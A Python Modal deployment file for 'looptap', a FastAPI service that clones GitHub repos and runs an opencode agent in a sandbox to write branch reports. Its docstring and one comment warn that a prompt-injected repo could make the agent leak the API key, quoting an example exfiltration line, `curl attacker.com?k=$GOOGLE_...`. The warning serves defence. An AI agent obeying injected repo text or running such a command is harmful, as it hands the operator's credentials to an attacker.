"""Modal deployment for looptap.

Three hats:
- wraps `looptap analyze` behind a FastAPI endpoint (the original stub)
- indexes + lists git clones in the `looptap-repos` Modal volume
- fans an HTML branch report out to a disposable Modal sandbox running opencode

Secrets: GOOGLE_API_KEY lives in the `looptap-secrets` Modal secret (populated
by scripts/setup.sh). We mirror it into GOOGLE_GENERATIVE_AI_API_KEY (what
opencode's google provider reads) for sandbox runs.

Security — use a scoped provider key:
    /analyze-repo shells out to opencode with `bash: allow` in the hosted
    config (opencode.hosted.json). The Modal sandbox is disposable, but the
    provider credential is *in its env* and a prompt-injected repo could
    coerce the agent into exfiltrating it (`curl attacker.com?k=$GOOGLE_...`).
    Mitigation: put a rate-limited, short-lived, single-purpose Google API
    key in `looptap-secrets` — NOT your primary key. Rotate it on a schedule.
    If your provider supports per-project or per-route scoping (Google AI
    Studio does), use that. The blast radius of the key *is* the blast radius
    of this endpoint.

Repo convention inside `looptap-repos`: one git clone per path `<owner>/<name>`.
POST /index-repo seeds it from a public GitHub URL; GET /repos lists what's
there; POST /analyze-repo spawns an opencode sandbox against a branch.

Test after deploy:

    curl -H "Modal-Key: $K" -H "Modal-Secret: $S" \\
         -X POST "$URL/index-repo" \\
         -H 'content-type: application/json' \\
         -d '{"repo":"TanGentleman/looptap","ref":"main"}'
    curl -H "Modal-Key: $K" -H "Modal-Secret: $S" "$URL/repos"
    curl -H "Modal-Key: $K" -H "Modal-Secret: $S" \\
         -X POST "$URL/analyze-repo" \\
         -H 'content-type: application/json' \\
         -d '{"repo":"TanGentleman/looptap","branch":"main"}' \\
         -o report.html
"""
from __future__ import annotations

import json
import os
import re
import shlex
import subprocess
from pathlib import Path
from typing import Any

import modal

APP_NAME = "looptap"
FUNCTION_NAME = "web"
SECRET_NAME = "looptap-secrets"
REPOS_VOLUME_NAME = "looptap-repos"
REPOS_MOUNT = "/repos"
SANDBOX_TIMEOUT = 1200  # opencode can chew on a diff for a while
INDEX_TIMEOUT = 600

BINARY_SRC = Path(__file__).parent / "bin" / "looptap"
SAMPLE_SRC = Path(__file__).parent / "claude.sample.md"
OPENCODE_CFG_SRC = Path(__file__).parent / "opencode.hosted.json"

BINARY_DST = "/opt/looptap/looptap"
SAMPLE_DST = "/root/.claude/CLAUDE.md"
OPENCODE_CFG_DST = "/opt/looptap/opencode.hosted.json"

# owner/name — alphanumeric bookends on each segment keep bare `.` / `..`
# out so `rm -rf "$dest"` can't climb out of /repos. Defense-in-depth
# containment check also runs in _validate_repo_slug.
_SEGMENT = r"[A-Za-z0-9](?:[A-Za-z0-9._-]*[A-Za-z0-9])?"
_REPO_SLUG_RE = re.compile(rf"{_SEGMENT}/{_SEGMENT}")

app = modal.App(APP_NAME)

repos_volume = modal.Volume.from_name(REPOS_VOLUME_NAME, create_if_missing=True)

image = (
    modal.Image.debian_slim(python_version="3.12")
    .apt_install("ca-certificates")
    .pip_install("fastapi==0.115.0")
    .add_local_file(str(BINARY_SRC), BINARY_DST, copy=True)
    .add_local_file(str(SAMPLE_SRC), SAMPLE_DST, copy=True)
    .dockerfile_commands(f"RUN chmod +x {BINARY_DST}")
)

# Sandbox image: opencode on PATH (via env, not a symlink — keeps upgrades
# idempotent), git for clone/fetch, plus the looptap binary so we reuse the
# html command's opencode wiring instead of re-implementing the prompt.
sandbox_image = (
    modal.Image.debian_slim(python_version="3.12")
    .apt_install("ca-certificates", "curl", "git")
    .run_commands("curl -fsSL https://opencode.ai/install | bash")
    .env({"PATH": "/root/.opencode/bin:${PATH}"})
    .add_local_file(str(BINARY_SRC), BINARY_DST, copy=True)
    .add_local_file(str(OPENCODE_CFG_SRC), OPENCODE_CFG_DST, copy=True)
    .dockerfile_commands(f"RUN chmod +x {BINARY_DST}")
)


def _validate_repo_slug(repo: str) -> str:
    trimmed = repo.strip().strip("/")
    if not _REPO_SLUG_RE.fullmatch(trimmed):
        raise ValueError(f"repo must match 'owner/name' with [A-Za-z0-9._-] (got {repo!r})")
    # Belt + suspenders: even if the regex ever loosens, refuse anything that
    # normalizes outside REPOS_MOUNT. Blocks `..` components and symlink-style
    # shenanigans before we shell out with the value.
    root = REPOS_MOUNT.rstrip("/")
    resolved = os.path.normpath(os.path.join(root, trimmed))
    if resolved != root and not resolved.startswith(root + "/"):
        raise ValueError(f"repo path {resolved!r} escapes {root!r}")
    return trimmed


def _list_indexed_repos() -> list[dict[str, Any]]:
    """Walk the mounted volume and collect <owner>/<name> entries. Reload
    first so a commit from another container becomes visible without a
    cold start.
    """
    repos_volume.reload()
    root = Path(REPOS_MOUNT)
    if not root.is_dir():
        return []
    out: list[dict[str, Any]] = []
    for owner_dir in sorted(root.iterdir()):
        if not owner_dir.is_dir() or owner_dir.name.startswith("."):
            continue
        for repo_dir in sorted(owner_dir.iterdir()):
            if not repo_dir.is_dir() or repo_dir.name.startswith("."):
                continue
            out.append({
                "repo": f"{owner_dir.name}/{repo_dir.name}",
                "path": str(repo_dir),
                "is_git": (repo_dir / ".git").is_dir(),
            })
    return out


def _run_analyze(file_path: str, as_json: bool) -> tuple[int, str, str]:
    """Shell out to looptap analyze. Returns (exit_code, stdout, stderr)."""
    key = os.environ.get("GOOGLE_API_KEY", "")
    env = {**os.environ, "GOOGLE_API_KEY": key, "HOME": "/root"}
    cmd = [BINARY_DST, "analyze", "--file", file_path]
    if as_json:
        cmd.append("--json")
    proc = subprocess.run(cmd, env=env, capture_output=True, text=True, timeout=120)
    return proc.returncode, proc.stdout, proc.stderr


def _sandbox_run(script: str, timeout: int) -> tuple[int, str, str]:
    """Run a bash script in a disposable sandbox with the repos volume mounted
    and both Gemini env var names populated. Returns (exit_code, stdout, stderr).
    """
    key = os.environ.get("GOOGLE_API_KEY", "")
    sb = modal.Sandbox.create(
        "bash", "-lc", script,
        image=sandbox_image,
        volumes={REPOS_MOUNT: repos_volume},
        secrets=[
            modal.Secret.from_name(SECRET_NAME),
            # looptap-secrets carries GOOGLE_API_KEY; opencode's google provider
            # wants GOOGLE_GENERATIVE_AI_API_KEY. Mirror it in.
            #
            # This key is visible to any bash the agent decides to run
            # (opencode.hosted.json grants `bash: allow` so git, ripgrep, etc.
            # work). Use a scoped/rate-limited key in looptap-secrets — not
            # your primary — so a prompt-injection-driven exfil caps out at a
            # key you were willing to lose.
            modal.Secret.from_dict({"GOOGLE_GENERATIVE_AI_API_KEY": key}),
        ],
        app=app,
        timeout=timeout,
    )
    try:
        sb.wait()
        return sb.returncode, sb.stdout.read(), sb.stderr.read()
    finally:
        sb.terminate()


def _index_script(repo: str, ref: str) -> str:
    """Shallow clone into the volume (or fast-forward an existing clone).
    Borrows the fetch/checkout/reset idempotency trick from the opencode-
    sandbox branch — always ends with the working tree pinned at origin/<ref>.
    """
    dest = shlex.quote(f"{REPOS_MOUNT}/{repo}")
    r = shlex.quote(ref)
    url = shlex.quote(f"https://github.com/{repo}.git")
    return (
        "set -euo pipefail\n"
        f"dest={dest}\n"
        "if [ -d \"$dest/.git\" ]; then\n"
        f"  echo \"updating existing clone at $dest\"\n"
        f"  git -C \"$dest\" fetch --depth 1 origin {r}\n"
        f"  git -C \"$dest\" checkout -q {r} 2>/dev/null || "
        f"git -C \"$dest\" checkout -q -B {r} origin/{r}\n"
        f"  git -C \"$dest\" reset --hard origin/{r}\n"
        "else\n"
        f"  echo \"fresh clone of {repo}@{ref}\"\n"
        "  mkdir -p \"$(dirname \"$dest\")\"\n"
        "  rm -rf \"$dest\"\n"
        f"  git clone --depth 1 --branch {r} {url} \"$dest\"\n"
        "fi\n"
        "git -C \"$dest\" --no-pager log -1 --oneline\n"
    )


def _analyze_script(repo: str, branch: str) -> str:
    """Refresh the cached clone, hardlink-clone into /tmp (so concurrent
    /analyze-repo calls don't stomp a shared working tree), pin the branch,
    then hand off to `looptap html`.
    """
    src = shlex.quote(f"{REPOS_MOUNT}/{repo}")
    b = shlex.quote(branch)
    binary = shlex.quote(BINARY_DST)
    cfg = shlex.quote(OPENCODE_CFG_DST)
    return (
        "set -euo pipefail\n"
        f"git -C {src} fetch --depth 1 origin {b} || true\n"
        "work=$(mktemp -d /tmp/looptap-work.XXXXXX)/repo\n"
        f"git clone --local {src} \"$work\"\n"
        "cd \"$work\"\n"
        f"git fetch --depth 1 origin {b}\n"
        f"git checkout -q {b} 2>/dev/null || git checkout -q -B {b} origin/{b}\n"
        f"{binary} html --agent opencode --is-sandbox "
        f"--opencode-config {cfg} "
        f"--repo . --branch {b} --force\n"
    )


@app.function(
    image=image,
    secrets=[modal.Secret.from_name(SECRET_NAME)],
    volumes={REPOS_MOUNT: repos_volume},
    timeout=SANDBOX_TIMEOUT + 60,
)
@modal.asgi_app(requires_proxy_auth=True)
def web():
    from fastapi import Body, FastAPI, HTTPException, Query
    from fastapi.responses import HTMLResponse, JSONResponse, PlainTextResponse

    api = FastAPI(title="looptap")

    @api.get("/", response_class=PlainTextResponse)
    def root() -> str:
        return (
            "looptap — hosted on Modal.\n"
            "  GET  /healthz                        liveness\n"
            "  GET  /analyze                        run `looptap analyze` on the sample CLAUDE.md\n"
            "  GET  /analyze?json=1                 raw JSON findings\n"
            "  GET  /repos                          list repos in the looptap-repos volume\n"
            "  POST /index-repo                     shallow-clone a public GitHub repo into the volume\n"
            '       body: {"repo":"owner/name","ref":"main"}\n'
            "  POST /analyze-repo                   opencode sandbox against owner/name@branch\n"
            '       body: {"repo":"owner/name","branch":"main"}\n'
        )

    @api.get("/healthz")
    def healthz():
        return {
            "binary": Path(BINARY_DST).is_file(),
            "sample_claude_md": Path(SAMPLE_DST).is_file(),
            "google_api_key": bool(os.environ.get("GOOGLE_API_KEY")),
            "repos_volume": Path(REPOS_MOUNT).is_dir(),
        }

    @api.get("/analyze")
    def analyze(json_out: bool = Query(False, alias="json")):
        if not os.environ.get("GOOGLE_API_KEY"):
            raise HTTPException(
                status_code=500,
                detail=(
                    f"GOOGLE_API_KEY missing from function env — check that the "
                    f"'{SECRET_NAME}' Modal secret has it set."
                ),
            )
        code, out, err = _run_analyze(SAMPLE_DST, as_json=json_out)
        if code != 0:
            raise HTTPException(
                status_code=502,
                detail={"exit_code": code, "stderr": err.strip() or None},
            )
        if json_out:
            try:
                return JSONResponse(content=json.loads(out))
            except json.JSONDecodeError:
                return JSONResponse(
                    status_code=502,
                    content={"error": "looptap did not return valid JSON", "stdout": out},
                )
        return PlainTextResponse(out)

    @api.get("/repos")
    def list_repos():
        try:
            entries = _list_indexed_repos()
        except Exception as exc:
            raise HTTPException(status_code=500, detail=f"listing {REPOS_MOUNT}: {exc}")
        return {"volume": REPOS_VOLUME_NAME, "mount": REPOS_MOUNT, "repos": entries}

    @api.post("/index-repo")
    def index_repo(payload: dict[str, Any] = Body(...)):
        try:
            repo = _validate_repo_slug(payload.get("repo") or "")
        except ValueError as exc:
            raise HTTPException(status_code=400, detail=str(exc))
        ref = (payload.get("ref") or "main").strip()
        if not ref:
            raise HTTPException(status_code=400, detail="ref must not be empty")

        code, out, err = _sandbox_run(_index_script(repo, ref), INDEX_TIMEOUT)
        if code != 0:
            raise HTTPException(
                status_code=502,
                detail={"exit_code": code, "stderr": err.strip() or None, "stdout": out},
            )
        # Sandbox auto-commits the volume on exit; reload so the next GET /repos
        # in this same container sees the new entry without a cold start.
        repos_volume.reload()
        return {"repo": repo, "ref": ref, "log": out.strip()}

    @api.post("/analyze-repo")
    def analyze_repo(payload: dict[str, Any] = Body(...)):
        try:
            repo = _validate_repo_slug(payload.get("repo") or "")
        except ValueError as exc:
            raise HTTPException(status_code=400, detail=str(exc))
        branch = (payload.get("branch") or "main").strip()
        if not branch:
            raise HTTPException(status_code=400, detail="branch must not be empty")

        repos_volume.reload()
        if not (Path(REPOS_MOUNT) / repo).is_dir():
            raise HTTPException(
                status_code=404,
                detail=(
                    f"{repo!r} not indexed. POST /index-repo {{\"repo\":\"{repo}\","
                    f"\"ref\":\"{branch}\"}} first."
                ),
            )
        if not os.environ.get("GOOGLE_API_KEY"):
            raise HTTPException(
                status_code=500,
                detail=f"GOOGLE_API_KEY missing from '{SECRET_NAME}'.",
            )

        code, out, err = _sandbox_run(_analyze_script(repo, branch), SANDBOX_TIMEOUT)
        if code != 0:
            raise HTTPException(
                status_code=502,
                detail={
                    "exit_code": code,
                    "stderr": err.strip() or None,
                    "stdout_preview": out[:500],
                },
            )
        return HTMLResponse(out)

    return api
